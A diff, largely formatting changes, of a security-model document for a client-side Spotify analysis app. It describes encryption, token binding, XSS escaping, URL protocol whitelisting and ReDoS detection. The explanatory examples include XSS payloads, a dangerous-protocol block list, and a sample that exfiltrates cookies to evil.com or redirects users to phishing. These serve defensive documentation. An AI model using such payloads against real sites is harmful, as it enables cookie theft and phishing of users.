@@ -37,13 +37,13 @@ This document describes the complete security model for Rhythm Chamber, a client
 
 **Core Principle:** 100% client-side processing with zero server infrastructure
 
-| Component | Security Approach | Benefit |
-|-----------|-------------------|---------|
-| **Data Processing** | Client-side only | No server attack surface |
-| **Data Storage** | Local only (IndexedDB) | User controls their data |
-| **AI Processing** | BYOI (Bring Your Own Intelligence) | User chooses provider |
-| **Authentication** | PKCE OAuth (no backend) | Direct Spotify integration |
-| **Encryption** | AES-GCM-256 client-side | Military-grade encryption |
+| Component           | Security Approach                  | Benefit                    |
+| ------------------- | ---------------------------------- | -------------------------- |
+| **Data Processing** | Client-side only                   | No server attack surface   |
+| **Data Storage**    | Local only (IndexedDB)             | User controls their data   |
+| **AI Processing**   | BYOI (Bring Your Own Intelligence) | User chooses provider      |
+| **Authentication**  | PKCE OAuth (no backend)            | Direct Spotify integration |
+| **Encryption**      | AES-GCM-256 client-side            | Military-grade encryption  |
 
 **Trade-offs:**
 True credential revocation and session invalidation require server infrastructure. In exchange for a zero-cost, privacy-first experience, we implement client-side mitigations that provide defense-in-depth without centralized control.
@@ -76,6 +76,7 @@ True credential revocation and session invalidation require server infrastructur
 **Your AI notices your patterns. Writes personalized narratives. Witnesses your evolution. Creates meaning from data.**
 
 Security enables emotional value by:
+
 - **Preserving narrative continuity**: Your AI witness maintains context across sessions
 - **Protecting personal stories**: Your musical journey remains private and intact
 - **Enabling deep reflection**: Safe exploration of emotional patterns without external judgment
@@ -85,6 +86,7 @@ Security enables emotional value by:
 **Data never leaves your device. Your AI, not a company's AI. Structurally private by design. Verifiable through open source.**
 
 Security enables privacy value by:
+
 - **Zero data transmission**: No servers, no cloud storage, no data collection
 - **Client-side encryption**: AES-GCM encryption for credentials
 - **Session isolation**: Each browser session is cryptographically isolated
@@ -95,6 +97,7 @@ Security enables privacy value by:
 **Choose your AI provider. Own your data completely. No vendor lock-in. Full transparency.**
 
 Security enables control value by:
+
 - **User-owned intelligence**: You control the AI model and API keys
 - **Data sovereignty**: You own your data completely
 - **No lock-in**: Export anytime, switch providers freely
@@ -130,6 +133,7 @@ Password + Session Salt + Device Secret
 **Implementation:** `js/security/key-manager.js` (651 lines)
 
 **Key Features:**
+
 - **Non-extractable keys** (`extractable: false`) - Cannot be exported from memory even with DevTools
 - **PBKDF2-100k iterations** - 10x OWASP 2024 minimum (appropriate for client-side apps)
 - **Session key caching** - Derived once per session, avoids repeated PBKDF2 computation
@@ -137,14 +141,15 @@ Password + Session Salt + Device Secret
 - **Device secret binding** - Stable across browser sessions, zero-trust compliant
 
 **API Usage:**
+
 ```javascript
 // Initialize session with password
 await Security.initializeKeySession(password);
 
 // Get keys for different purposes
-const sessionKey = await Security.getSessionKeyKM();       // General crypto
-const encKey = await Security.getDataEncryptionKey();       // Storage encryption
-const signingKey = await Security.getSigningKey();          // Message signing
+const sessionKey = await Security.getSessionKeyKM(); // General crypto
+const encKey = await Security.getDataEncryptionKey(); // Storage encryption
+const signingKey = await Security.getSigningKey(); // Message signing
 
 // Clear session on logout
 Security.clearKeySession();
@@ -157,6 +162,7 @@ Security.clearKeySession();
 **Algorithm:** AES-GCM-256 (Authenticated Encryption)
 
 **Key Features:**
+
 - **Authenticated encryption** - Detects tampering
 - **Unique 96-bit IV per operation** - Prevents pattern analysis
 - **Automatic data classification** - API keys, chat history auto-detected
@@ -164,6 +170,7 @@ Security.clearKeySession();
 - **Secure deletion** - Random overwrite before delete
 
 **API Usage:**
+
 ```javascript
 // Encrypt data
 const encKey = await Security.getDataEncryptionKey();
@@ -180,6 +187,7 @@ const migrated = await Security.migrateData(oldKey, newKey, encrypted);
 ```
 
 **Protected Data Patterns:**
+
 - API keys: `openrouter.apiKey`, `gemini.apiKey`, etc.
 - Chat history: `chat_*` patterns
 - Credentials: Any key ending in `credentials`, `token`, `apiKey`
@@ -193,6 +201,7 @@ const migrated = await Security.migrateData(oldKey, newKey, encrypted);
 **Purpose:** Cross-tab communication authentication
 
 **Key Features:**
+
 - **Message authentication** - Detects message spoofing
 - **Timestamp validation** - 5-second window for freshness
 - **Nonce tracking** - Prevents replay attacks (max 1000 nonces)
@@ -200,6 +209,7 @@ const migrated = await Security.migrateData(oldKey, newKey, encrypted);
 - **Sensitive field sanitization** - Removes API keys, tokens before broadcast
 
 **API Usage:**
+
 ```javascript
 // Sign message
 const signingKey = await Security.getSigningKey();
@@ -225,10 +235,12 @@ const isReplay = Security.isNonceUsed(nonce);
 **Purpose:** End-to-end secure messaging for profile sharing
 
 **Algorithms:**
+
 - RSA-OAEP-2048 for key transport
 - AES-GCM-256 for data encryption
 
 **API Usage:**
+
 ```javascript
 // Encrypt for recipient
 const encrypted = await Security.hybridEncrypt(plaintext, recipientPublicKey);
@@ -244,6 +256,7 @@ const decrypted = await Security.hybridDecrypt(ciphertext, privateKey);
 **Algorithm:** JWT-based license verification with HMAC-SHA256
 
 **Key Features:**
+
 - Device fingerprint binding
 - Integrity checksums
 - Session isolation
@@ -260,6 +273,7 @@ const decrypted = await Security.hybridDecrypt(ciphertext, privateKey);
 **Purpose:** Bind tokens to device to prevent credential theft
 
 **Fingerprint Components:**
+
 - Browser language
 - Platform
 - Timezone
@@ -268,20 +282,22 @@ const decrypted = await Security.hybridDecrypt(ciphertext, privateKey);
 - Session salt (unique per browser session)
 
 **API Usage:**
+
 ```javascript
 // Create token binding on successful OAuth
 await Security.createTokenBinding(accessToken);
 
 // Verify before EVERY API call
-await Security.verifyTokenBinding(token);  // Throws on mismatch
+await Security.verifyTokenBinding(token); // Throws on mismatch
 ```
 
 **Secure Context Enforcement:**
+
 ```javascript
 const check = Security.checkSecureContext();
 if (!check.secure) {
-    throw new Error(check.reason);
-    // Blocks: insecure contexts, cross-origin iframes, data:/blob: protocols
+  throw new Error(check.reason);
+  // Blocks: insecure contexts, cross-origin iframes, data:/blob: protocols
 }
 ```
 
@@ -292,12 +308,14 @@ if (!check.secure) {
 **Purpose:** Single authority token management
 
 **Key Features:**
+
 - Mandatory verification before ANY token operation
 - Read-only verification with rate limiting (max 10/min)
 - Automatic invalidation on mismatch
 - Audit logging for all operations
 
 **Security Features:**
+
 - **Fail-closed design** - Explicit blocking when security unavailable
 - **Device binding** - SHA-256 fingerprints with session salt
 - **Geographic anomaly detection** - Detects proxy/VPN-based credential stuffing
@@ -308,11 +326,13 @@ if (!check.secure) {
 **Purpose:** Automatic credential invalidation on auth events
 
 **Triggers:**
+
 - Token refresh failures
 - Explicit logout
 - Password changes
 
 **API Usage:**
+
 ```javascript
 // Invalidate all encrypted credentials
 await Security.invalidateSessions();
@@ -324,25 +344,32 @@ await Security.invalidateSessions();
 ### 4.4 Encryption Key Migration (v1.0 Breaking Change)
 
 **Before (v0.x):**
+
 ```javascript
-`${sessionSalt}:${spotify_refresh_token}:rhythm-chamber:v${version}`
+`${sessionSalt}:${spotify_refresh_token}:rhythm-chamber:v${version}`;
 ```
+
 **Problems:**
+
 - Third-party token (Spotify) used as key material - violates zero-trust
 - Token compromised = all encrypted data compromised
 - Token lifecycle issues when tokens expired/changed
 
 **After (v1.0+):**
+
 ```javascript
-`${sessionSalt}:${device_secret}:rhythm-chamber:v${version}`
+`${sessionSalt}:${device_secret}:rhythm-chamber:v${version}`;
 ```
+
 **Benefits:**
+
 - Zero-trust compliant - no third-party credentials in key material
 - Device-bound encryption
 - Stable across browser sessions
 - Independent of OAuth token lifecycle
 
 **Migration Impact:**
+
 - **Affected:** Previously encrypted API keys, credentials, session data
 - **Not Affected:** User data files, preferences, chat history
 - **User Action:** Most users just reconnect Spotify and/or re-enter API keys
@@ -386,17 +413,20 @@ await Security.invalidateSessions();
 **Implementation:** `js/storage/write-ahead-log.js` (1017 lines)
 
 **Key Features:**
+
 - Priority queue (CRITICAL > HIGH > NORMAL > LOW)
 - WAL persistence to localStorage
 - Crash recovery with automatic replay
 - Adaptive batching based on device performance
 
 **CRITICAL FIX #1: Promise Resolution Across Reloads**
+
 - **Problem:** WAL promises lost on page reload
 - **Solution:** `waitForResult(entryId)` with persisted operation results
 - **Result:** 5-minute result retention for crash recovery
 
 **CRITICAL FIX #2: Idempotent Replay**
+
 - **Problem:** ConstraintError when operation committed but entry not cleared
 - **Solution:** Convert `add()` → `put()` during WAL replay
 - **Result:** Prevents duplicate key errors
@@ -408,12 +438,14 @@ await Security.invalidateSessions();
 **Implementation:** `js/storage/transaction/` (5 files)
 
 **Protocol Phases:**
+
 1. **Prepare** - All resources vote YES/NO
 2. **Decision** - Write commit marker (point of no return)
 3. **Commit** - Execute prepared operations
 4. **Cleanup** - Remove pending data
 
 **Safety Features:**
+
 - Nested transaction guard (prevents accidental nesting)
 - Fatal state management (halt system on rollback failure)
 - Compensation logging (manual recovery if rollback fails)
@@ -422,12 +454,14 @@ await Security.invalidateSessions();
 ### 5.4 Quota Management
 
 **CRITICAL FIX #5: Reservation System**
+
 - **Problem:** TOCTOU race in quota checks
 - **Solution:** Check quota → create reservation → write → release reservation
 - **Result:** Prevents time-of-check-to-time-of-use race condition
 - **Auto-release:** Stale reservations after 30 seconds
 
 **CRITICAL FIX #12: Pending Write Accounting**
+
 - **Problem:** Quota checks don't account for pending writes
 - **Solution:** `checkWriteFits(writeSizeBytes)` returns reservation ID
 - **Result:** Prevents scenarios where check passes but actual write exceeds quota
@@ -435,6 +469,7 @@ await Security.invalidateSessions();
 ### 5.5 Transaction Isolation
 
 **CRITICAL FIX #1: Explicit Transaction Pool**
+
 - **Problem:** Concurrent transactions violating atomicity
 - **Solution:** Acquire or create transaction with proper locking
 - **Result:** Track transaction state to prevent reuse of completed transactions
@@ -443,11 +478,13 @@ await Security.invalidateSessions();
 ### 5.6 LRU Cache with Pinned Items
 
 **CRITICAL FIX #6: Prevent Eviction During Processing**
+
 - **Problem:** Items evicted during active worker processing
 - **Solution:** Pin items during active worker processing
 - **Result:** Pinned items excluded from eviction selection
 
 **Issue #20 Fix: Eviction Callbacks**
+
 - **Problem:** Items evicted silently, causing resource leaks
 - **Solution:** `setMaxSize()` now calls `onEvict` for each evicted item
 - **Result:** Proper cleanup of evicted items
@@ -459,6 +496,7 @@ await Security.invalidateSessions();
 ### 6.1 Message Signing Flow
 
 **Outgoing Messages:**
+
 ```
 sendMessage()
     ↓
@@ -471,6 +509,7 @@ BroadcastChannel.postMessage()
 ```
 
 **Incoming Messages:**
+
 ```
 createMessageHandler()
     ↓
@@ -485,6 +524,7 @@ Process message
 ### 6.2 Security Guarantees
 
 **Data in Transit:**
+
 - ✅ HMAC-SHA256 message authentication for cross-tab communication
 - ✅ Origin validation prevents malicious tab injection
 - ✅ Timestamp validation rejects stale messages
@@ -500,6 +540,7 @@ Process message
 **Implementation:** `js/utils/html-escape.js`
 
 **Core Escaping Function:**
+
 ```javascript
 /**
  * Escape HTML to prevent XSS attacks
@@ -509,22 +550,23 @@ Process message
  * from executing when user content is displayed via innerHTML.
  */
 export function escapeHtml(text) {
-    // Handle null/undefined/non-string inputs
-    if (text == null) {
-        return '';
-    }
+  // Handle null/undefined/non-string inputs
+  if (text == null) {
+    return '';
+  }
 
-    // Coerce to string
-    const str = String(text);
+  // Coerce to string
+  const str = String(text);
 
-    // Use DOM-based escaping for most reliable results
-    const div = document.createElement('div');
-    div.textContent = str;
-    return div.innerHTML;
+  // Use DOM-based escaping for most reliable results
+  const div = document.createElement('div');
+  div.textContent = str;
+  return div.innerHTML;
 }
 ```
 
 **Why This Approach is Secure:**
+
 1. **DOM-Based Escaping**: Uses browser's native HTML entity encoding
 2. **Handles All Entities**: `< > & " '` and Unicode automatically
 3. **More Reliable**: Better than regex-based approaches
@@ -545,6 +587,7 @@ Every instance of `innerHTML` usage is properly protected through:
 5. **Security-conscious coding practices** throughout the codebase
 
 **Test Coverage:**
+
 - Total JavaScript files analyzed: 253
 - Files with innerHTML usage: 19 files
 - Dynamic content locations: 32 locations
@@ -553,6 +596,7 @@ Every instance of `innerHTML` usage is properly protected through:
 ### 7.3 XSS Prevention Techniques
 
 **1. Event Delegation Pattern:**
+
 ```javascript
 // ❌ BAD: Inline event handlers
 button.onclick = `doSomething('${userInput}')`;
@@ -564,26 +608,28 @@ button.setAttribute('data-param', escapeHtml(userInput));
 ```
 
 **2. Tool Name Whitelisting:**
+
 ```javascript
 // SECURITY: Whitelist of valid tool names to prevent XSS
 const VALID_TOOL_NAMES = [
-    'DataQuery',
-    'PatternAnalyzer',
-    'PersonalityClassifier',
-    'StreamProcessor'
+  'DataQuery',
+  'PatternAnalyzer',
+  'PersonalityClassifier',
+  'StreamProcessor',
 ];
 
 function isValidToolName(name) {
-    return VALID_TOOL_NAMES.includes(name);
+  return VALID_TOOL_NAMES.includes(name);
 }
 ```
 
 **3. Session ID Validation:**
+
 ```javascript
 // Validate session ID format
 const SESSION_ID_PATTERN = /^[a-z0-9\-_]+$/i;
 if (!SESSION_ID_PATTERN.test(sessionId)) {
-    throw new Error('Invalid session ID format');
+  throw new Error('Invalid session ID format');
 }
 ```
 
@@ -598,63 +644,74 @@ if (!SESSION_ID_PATTERN.test(sessionId)) {
 The JavaScript `URL` constructor accepts dangerous protocols like `javascript:`, `data:`, `vbscript:`, etc., which can lead to XSS attacks when user-controlled URLs are used in sensitive contexts like `<a href>` attributes or `location.href`.
 
 **Attack Example:**
+
 ```javascript
 // ❌ VULNERABLE CODE (before fix)
-const url = new URL(userInput);  // Accepts "javascript:alert(1)"
-a.href = url.href;  // XSS!
+const url = new URL(userInput); // Accepts "javascript:alert(1)"
+a.href = url.href; // XSS!
 ```
 
 **Fix Implementation:**
+
 ```javascript
 // ✅ SECURE CODE (after fix)
 export function validateURL(url, options = {}) {
-    const { allowedProtocols = ['http:', 'https:'] } = options;
+  const { allowedProtocols = ['http:', 'https:'] } = options;
 
-    // Type validation
-    if (typeof url !== 'string') {
-        return { valid: false, error: 'URL must be a string' };
+  // Type validation
+  if (typeof url !== 'string') {
+    return { valid: false, error: 'URL must be a string' };
+  }
+
+  const trimmed = url.trim();
+
+  // SECURITY: Extract protocol BEFORE parsing to reject dangerous schemes
+  const protocolMatch = trimmed.match(/^([a-zA-Z][a-zA-Z0-9+.-]*):/);
+
+  if (!protocolMatch) {
+    return { valid: false, error: 'URL must include a protocol (e.g., https://)' };
+  }
+
+  const protocol = protocolMatch[1].toLowerCase() + ':';
+
+  // SECURITY: Strict protocol whitelist validation
+  if (!allowedProtocols.includes(protocol)) {
+    // Check for known dangerous protocols
+    const dangerousProtocols = [
+      'javascript:',
+      'data:',
+      'vbscript:',
+      'file:',
+      'about:',
+      'chrome:',
+      'chrome-extension:',
+    ];
+
+    if (dangerousProtocols.includes(protocol)) {
+      return {
+        valid: false,
+        error: `Dangerous protocol "${protocol}" is not allowed for security reasons`,
+      };
     }
 
-    const trimmed = url.trim();
+    return {
+      valid: false,
+      error: `URL protocol "${protocol}" is not allowed. Allowed protocols are: ${allowedProtocols.join(', ')}`,
+    };
+  }
 
-    // SECURITY: Extract protocol BEFORE parsing to reject dangerous schemes
-    const protocolMatch = trimmed.match(/^([a-zA-Z][a-zA-Z0-9+.-]*):/);
-
-    if (!protocolMatch) {
-        return { valid: false, error: 'URL must include a protocol (e.g., https://)' };
-    }
-
-    const protocol = protocolMatch[1].toLowerCase() + ':';
-
-    // SECURITY: Strict protocol whitelist validation
-    if (!allowedProtocols.includes(protocol)) {
-        // Check for known dangerous protocols
-        const dangerousProtocols = ['javascript:', 'data:', 'vbscript:', 'file:', 'about:', 'chrome:', 'chrome-extension:'];
-
-        if (dangerousProtocols.includes(protocol)) {
-            return {
-                valid: false,
-                error: `Dangerous protocol "${protocol}" is not allowed for security reasons`
-            };
-        }
-
-        return {
-            valid: false,
-            error: `URL protocol "${protocol}" is not allowed. Allowed protocols are: ${allowedProtocols.join(', ')}`
-        };
-    }
-
-    // Now safe to parse with URL constructor
-    try {
-        const normalized = new URL(trimmed);
-        return { valid: true, normalizedValue: normalized.href };
-    } catch (e) {
-        return { valid: false, error: 'Invalid URL format' };
-    }
+  // Now safe to parse with URL constructor
+  try {
+    const normalized = new URL(trimmed);
+    return { valid: true, normalizedValue: normalized.href };
+  } catch (e) {
+    return { valid: false, error: 'Invalid URL format' };
+  }
 }
 ```
 
 **Key Security Features:**
+
 1. **Pre-validation**: Protocol is extracted and validated BEFORE the URL constructor is called
 2. **Strict whitelist**: Only explicitly allowed protocols are accepted (http:, https: by default)
 3. **Dangerous protocol detection**: Known dangerous protocols trigger specific error messages
@@ -662,6 +719,7 @@ export function validateURL(url, options = {}) {
 5. **Clear error messages**: Developers get actionable feedback about security violations
 
 **Blocked Protocols:**
+
 - `javascript:` - Can execute arbitrary JavaScript (XSS)
 - `data:` - Can embed arbitrary HTML/JavaScript content (XSS)
 - `vbscript:` - Can execute VBScript (IE, legacy XSS risk)
@@ -670,44 +728,48 @@ export function validateURL(url, options = {}) {
 - `chrome:`, `chrome-extension:` - Browser internals (privilege escalation)
 
 **Test Coverage:**
+
 ```javascript
 // All dangerous protocols are blocked
-validateURL('javascript:alert(1)');  // { valid: false, error: "Dangerous protocol..." }
-validateURL('data:text/html,<script>alert(1)</script>');  // Blocked
-validateURL('vbscript:msgbox("XSS")');  // Blocked
-validateURL('file:///etc/passwd');  // Blocked
+validateURL('javascript:alert(1)'); // { valid: false, error: "Dangerous protocol..." }
+validateURL('data:text/html,<script>alert(1)</script>'); // Blocked
+validateURL('vbscript:msgbox("XSS")'); // Blocked
+validateURL('file:///etc/passwd'); // Blocked
 
 // Safe protocols are accepted
-validateURL('https://example.com');  // { valid: true, normalizedValue: "https://example.com/" }
-validateURL('http://localhost:8080');  // { valid: true }
+validateURL('https://example.com'); // { valid: true, normalizedValue: "https://example.com/" }
+validateURL('http://localhost:8080'); // { valid: true }
 ```
 
 **Usage Example:**
+
 ```javascript
 import { validateURL } from './utils/validation/format-validators.js';
 
 // Validate user input before using in sensitive context
 function setUserLink(userInput) {
-    const result = validateURL(userInput);
+  const result = validateURL(userInput);
 
-    if (!result.valid) {
-        console.error('Invalid URL:', result.error);
-        return;
-    }
+  if (!result.valid) {
+    console.error('Invalid URL:', result.error);
+    return;
+  }
 
-    // Safe to use
-    linkElement.href = result.normalizedValue;
+  // Safe to use
+  linkElement.href = result.normalizedValue;
 }
 ```
 
 **Why This Matters:**
 Without protocol whitelist validation, an attacker could submit:
+
 - `javascript:document.cookie` - Steal session cookies
 - `data:text/html,<script>fetch('https://evil.com?'+document.cookie)</script>` - Exfiltrate data
 - `javascript:window.location='https://evil.com/phishing'` - Redirect to phishing site
 
 **Defense in Depth:**
 This validation works alongside other XSS prevention measures:
+
 - Content Security Policy (CSP) blocks `javascript:` in most contexts
 - HTML escaping prevents XSS in DOM manipulation
 - Input validation provides an additional security layer
@@ -717,6 +779,7 @@ This validation works alongside other XSS prevention measures:
 **Deployment Configuration:**
 
 **Vercel** (`vercel.json`):
+
 ```json
 {
   "headers": [
@@ -762,6 +825,7 @@ This validation works alongside other XSS prevention measures:
 **1. Updated Dangerous Patterns Array:**
 
 **Before:**
+
 ```javascript
 DANGEROUS_PATTERNS: [
     /\(([a-zA-Z*+]+)\+/,  // Only matches letters inside parens!
@@ -769,6 +833,7 @@ DANGEROUS_PATTERNS: [
 ```
 
 **After:**
+
 ```javascript
 DANGEROUS_PATTERNS: [
     // Nested quantifiers - catches ((a+)+, ((a*)+, (a+)+, etc.
@@ -788,22 +853,22 @@ DANGEROUS_PATTERNS: [
 
 ```javascript
 function _detectNestedQuantifiers(pattern) {
-    // Track quantifier positions: * + ? {n,m}
-    // Track group structure: ( )
-    // Detect nesting when quantifiers are close together
+  // Track quantifier positions: * + ? {n,m}
+  // Track group structure: ( )
+  // Detect nesting when quantifiers are close together
 
-    // Check for pattern like )+ or )* followed by another quantifier
-    if (/\)\s*[*+]/.test(between)) {
-        return { hasNestedQuantifiers: true, details: '...' };
-    }
+  // Check for pattern like )+ or )* followed by another quantifier
+  if (/\)\s*[*+]/.test(between)) {
+    return { hasNestedQuantifiers: true, details: '...' };
+  }
 
-    // Specific check for double-nested patterns like ((a+)+
-    const doubleNested = /\(\([^)]*[*+][^)]*\)[*+]/;
-    if (doubleNested.test(pattern)) {
-        return { hasNestedQuantifiers: true, details: '...' };
-    }
+  // Specific check for double-nested patterns like ((a+)+
+  const doubleNested = /\(\([^)]*[*+][^)]*\)[*+]/;
+  if (doubleNested.test(pattern)) {
+    return { hasNestedQuantifiers: true, details: '...' };
+  }
 
-    // Additional checks...
+  // Additional checks...
 }
 ```
 
@@ -811,26 +876,27 @@ function _detectNestedQuantifiers(pattern) {
 
 ```javascript
 function _validateRegexPattern(pattern) {
-    // AST-based detection of nested quantifiers (catches bypass patterns)
-    const astCheck = _detectNestedQuantifiers(pattern);
-    if (astCheck.hasNestedQuantifiers) {
-        return { safe: false, reason: `Pattern contains nested quantifiers (ReDoS risk)` };
-    }
+  // AST-based detection of nested quantifiers (catches bypass patterns)
+  const astCheck = _detectNestedQuantifiers(pattern);
+  if (astCheck.hasNestedQuantifiers) {
+    return { safe: false, reason: `Pattern contains nested quantifiers (ReDoS risk)` };
+  }
 
-    // Check for known dangerous patterns
-    for (const dangerous of REGEX_CONFIG.DANGEROUS_PATTERNS) {
-        if (dangerous.test(pattern)) {
-            return { safe: false, reason: `Pattern contains dangerous construct` };
-        }
+  // Check for known dangerous patterns
+  for (const dangerous of REGEX_CONFIG.DANGEROUS_PATTERNS) {
+    if (dangerous.test(pattern)) {
+      return { safe: false, reason: `Pattern contains dangerous construct` };
     }
+  }
 
-    // Additional checks...
+  // Additional checks...
 }
 ```
 
 ### 8.3 Test Coverage
 
 **37 test cases covering:**
+
 - Original bypass patterns
 - Complex nested quantifiers
 - Lookahead/negative lookahead variants
@@ -842,6 +908,7 @@ function _validateRegexPattern(pattern) {
 **All tests pass:** ✅
 
 **Verification Script:** `verify-redos-fix.js`
+
 ```bash
 node verify-redos-fix.js
 # ✓ SUCCESS: All ReDoS bypass patterns are now properly detected!
@@ -877,28 +944,30 @@ node verify-redos-fix.js
 **Purpose:** Secure Spotify authentication without backend
 
 **Security Improvements (v0.9 Milestone):**
+
 - **Removed localStorage fallback** for PKCE verifier (HIGH Issue #7)
 - **State parameter** for CSRF protection
 - **State verification** on callback
 - **Rejection sampling** for modulo bias prevention
 
 **Rejection Sampling Implementation:**
+
 ```javascript
 function generateCodeVerifier() {
-    const possible = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    const maxValid = Math.floor(256 / possible.length) * possible.length; // 248
+  const possible = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  const maxValid = Math.floor(256 / possible.length) * possible.length; // 248
 
-    const result = [];
-    while (result.length < 64) {
-        const values = crypto.getRandomValues(new Uint8Array(bytesNeeded));
-        for (const x of values) {
-            // Rejection sampling: only use values < 248 to avoid bias
-            if (x < maxValid && result.length < 64) {
-                result.push(possible[x % possible.length]);
-            }
-        }
+  const result = [];
+  while (result.length < 64) {
+    const values = crypto.getRandomValues(new Uint8Array(bytesNeeded));
+    for (const x of values) {
+      // Rejection sampling: only use values < 248 to avoid bias
+      if (x < maxValid && result.length < 64) {
+        result.push(possible[x % possible.length]);
+      }
     }
-    return result.join('');
+  }
+  return result.join('');
 }
 ```
 
@@ -907,6 +976,7 @@ function generateCodeVerifier() {
 **Implementation:** `js/spotify/refresh-service.js`
 
 **Key Features:**
+
 - Automatic token refresh before expiration
 - Error handling for refresh failures
 - Secure token storage via SecureTokenStore
@@ -917,19 +987,19 @@ function generateCodeVerifier() {
 
 ### 10.1 What We Protect Against
 
-| Threat | Mitigation | Value Layer |
-|--------|-----------|-------------|
-| **Casual DevTools inspection** | AES-GCM encryption for credentials | Privacy |
-| **Credential replay attacks** | Session-bound key derivation | Privacy |
-| **Stale session persistence** | Session versioning with invalidation | Privacy |
-| **Proxy/VPN credential stuffing** | Geographic anomaly detection | Privacy |
-| **Timezone manipulation** | UTC-based time calculations | Privacy |
-| **XSS token theft** | Device fingerprint binding | Privacy |
-| **Token hijacking** | Secure context enforcement | Privacy |
-| **False positive lockouts** | Travel-aware adaptive thresholds | Privacy |
-| **Narrative corruption** | Checksum validation for AI context | Emotional |
-| **Story fragmentation** | Session continuity preservation | Emotional |
-| **ReDoS attacks** | AST-based detection + pattern validation | All |
+| Threat                            | Mitigation                               | Value Layer |
+| --------------------------------- | ---------------------------------------- | ----------- |
+| **Casual DevTools inspection**    | AES-GCM encryption for credentials       | Privacy     |
+| **Credential replay attacks**     | Session-bound key derivation             | Privacy     |
+| **Stale session persistence**     | Session versioning with invalidation     | Privacy     |
+| **Proxy/VPN credential stuffing** | Geographic anomaly detection             | Privacy     |
+| **Timezone manipulation**         | UTC-based time calculations              | Privacy     |
+| **XSS token theft**               | Device fingerprint binding               | Privacy     |
+| **Token hijacking**               | Secure context enforcement               | Privacy     |
+| **False positive lockouts**       | Travel-aware adaptive thresholds         | Privacy     |
+| **Narrative corruption**          | Checksum validation for AI context       | Emotional   |
+| **Story fragmentation**           | Session continuity preservation          | Emotional   |
+| **ReDoS attacks**                 | AST-based detection + pattern validation | All         |
 
 ### 10.2 What We Cannot Protect Against
 
@@ -937,12 +1007,14 @@ function generateCodeVerifier() {
 > **Determined Local Attackers**: A sophisticated attacker with full access to your browser's memory can extract any client-side secrets. This is a fundamental limitation of browser-based apps.
 
 **Limitations:**
+
 - Full memory introspection (browser DevTools)
 - Browser extension attacks
 - Compromised browser
 - Physical device access
 
 **No Forward Secrecy:**
+
 - Session salt provides isolation but not true forward secrecy
 - Would require ephemeral key exchange (e.g., Diffie-Hellman)
 
@@ -957,18 +1029,21 @@ function generateCodeVerifier() {
 **Requirements Satisfied:** 24/24 (100%)
 
 **Achievements:**
+
 1. **Three-tier key management system** with non-extractable keys
 2. **AES-GCM-256 storage encryption** for all sensitive data
 3. **HMAC-SHA256 message signing** for cross-tab communication
 4. **Defense-in-depth architecture** without sacrificing zero-backend philosophy
 
 **New Security Modules:**
+
 - `js/security/key-manager.js` (651 lines) - Key lifecycle management
 - `js/security/crypto.js` (495 lines) - Storage encryption
 - `js/security/message-security.js` (698 lines) - Message authentication
 - `js/security/token-binding.js` (353 lines) - Device fingerprint binding
 
 **Security Guarantees:**
+
 - ✅ AES-GCM-256 encryption for API keys and chat history
 - ✅ Non-extractable keys cannot be exported from memory
 - ✅ Unique IV per encryption prevents pattern analysis
@@ -981,6 +1056,7 @@ function generateCodeVerifier() {
 **Completed:** 2026-01-28
 
 **Findings:**
+
 - **56 instances** of `innerHTML` flagged by SAST scanner
 - **0 exploitable vulnerabilities** found
 - **100% coverage** - All dynamic content properly escaped
@@ -997,6 +1073,7 @@ function generateCodeVerifier() {
 **Attack:** Open DevTools → localStorage → copy API key
 
 **Mitigation:** Credentials are AES-GCM encrypted. Attacker sees:
+
 ```
 rhythm_chamber_encrypted_creds: {"service_credentials":{"cipher":"ZnVja3lvdXRoaXNpc2VuY3J5cHRlZA==..."}}
 ```
@@ -1008,6 +1085,7 @@ Without the active session key, decryption fails.
 **Attack:** Inject script to steal Spotify access token from localStorage
 
 **Mitigation:**
+
 1. Token is bound to device fingerprint at creation
 2. Every API request verifies fingerprint match
 3. Fingerprint includes session-specific salt (different per browser tab/session)
@@ -1019,6 +1097,7 @@ Without the active session key, decryption fails.
 **Attack:** Steal old session → use after victim changes password
 
 **Mitigation:**
+
 1. Session version increments on any auth failure
 2. Old encrypted credentials become undecryptable
 3. User must re-authenticate and re-enter credentials
@@ -1028,8 +1107,9 @@ Without the active session key, decryption fails.
 **Attack:** Use 100 VPN servers to bypass rate limiting
 
 **Mitigation:**
+
 1. Connection fingerprint hash tracked
-2. >3 distinct fingerprints in 1 hour triggers "geographic anomaly"
+2. > 3 distinct fingerprints in 1 hour triggers "geographic anomaly"
 3. Rate limit threshold reduced by 50%
 4. Additional failures result in lockout
 
@@ -1038,8 +1118,9 @@ Without the active session key, decryption fails.
 **Issue:** User travels to new location, gets locked out
 
 **Mitigation (Adaptive Thresholds):**
+
 1. Time between geo changes analyzed
-2. >10 min between changes = travel pattern detected
+2. > 10 min between changes = travel pattern detected
 3. Threshold increased by 50% for traveling users
 4. Clear error messages with wait time estimates
 
@@ -1050,6 +1131,7 @@ Without the active session key, decryption fails.
 ### 13.1 For Users
 
 **DO:**
+
 - ✅ Use HTTPS (enforced by secure context check)
 - ✅ Disable browser extensions when using sensitive features
 - ✅ Clear sensitive data before sharing screenshots
@@ -1057,6 +1139,7 @@ Without the active session key, decryption fails.
 - ✅ Keep your browser updated
 
 **DON'T:**
+
 - ❌ Use on public WiFi without VPN (if concerned about local network attacks)
 - ❌ Share screenshots with visible credentials or personal data
 - ❌ Leave browser unattended on sensitive screens
@@ -1065,6 +1148,7 @@ Without the active session key, decryption fails.
 ### 13.2 For Developers
 
 **DO:**
+
 - ✅ Always escape dynamic content with `escapeHtml()` before innerHTML
 - ✅ Use `textContent` instead of `innerHTML` when possible
 - ✅ Prefer `document.createElement()` over HTML strings
@@ -1074,6 +1158,7 @@ Without the active session key, decryption fails.
 - ✅ Review all innerHTML usage for proper escaping
 
 **DON'T:**
+
 - ❌ Use `innerHTML` with unescaped user input
 - ❌ Concatenate user input into HTML strings
 - ❌ Use inline event handlers with dynamic data: `onclick="func('${userInput}')"`
@@ -1083,6 +1168,7 @@ Without the active session key, decryption fails.
 ### 13.3 Code Review Checklist
 
 **For all code changes:**
+
 - [ ] All dynamic content escaped with `escapeHtml()`
 - [ ] No inline event handlers with user data
 - [ ] Input validated against whitelist/type check
@@ -1108,6 +1194,7 @@ If you discover a security vulnerability in Rhythm Chamber:
 **Email:** security@rhythm-chamber.com (placeholder - update with actual contact)
 
 **What to Include:**
+
